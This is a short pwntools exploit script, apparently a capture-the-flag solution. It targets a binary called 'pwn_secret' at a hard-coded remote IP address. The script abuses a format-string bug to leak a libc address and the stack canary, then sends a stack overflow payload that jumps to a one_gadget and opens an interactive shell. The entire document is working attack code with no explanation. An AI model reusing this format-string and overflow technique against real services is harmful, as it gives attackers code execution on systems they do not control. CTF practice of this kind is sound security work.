from pwn import *

context.terminal=['tmux', 'neww']

libc = ELF('./libc.so.6')

#r = process('./pwn_secret')
r = remote('206.81.24.129', 1339)

r.sendline("%p"*15)

r.recvuntil('0x')
r.recvuntil('0x')
libc_base = int(r.recvn(12), 16)-0x3c6780
print "libc_base @ ", hex(libc_base)
canary = int(r.recvline()[-17:], 16)
print "canary = ", hex(canary)
one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
one_shot = libc_base + one_gadget[0]


payload = 'a'*0x88 + p64(canary) + 'a'*8 + p64(one_shot)
r.sendlineafter(':', payload)

r.interactive()